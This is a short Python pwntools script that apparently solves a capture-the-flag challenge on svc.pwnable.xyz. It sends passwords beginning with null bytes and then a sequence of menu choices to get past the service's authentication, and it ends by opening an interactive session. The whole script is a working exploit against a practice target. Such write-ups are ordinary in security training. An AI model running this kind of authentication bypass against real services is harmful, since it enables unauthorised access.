from pwn import *

debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz',30026)
else:
    sh = process('./challenge')
sh.sendlineafter('User ID: ', '1')
sh.sendlineafter('> ', '1')
sh.sendafter('Password: ', '\x00helloelliotMrRobot134ev')
sh.sendlineafter('> ', '2')
sh.sendafter('New password: ', '\x00')
sh.sendlineafter('> ', '4')
sh.sendlineafter('> ', '3')
sh.interactive()

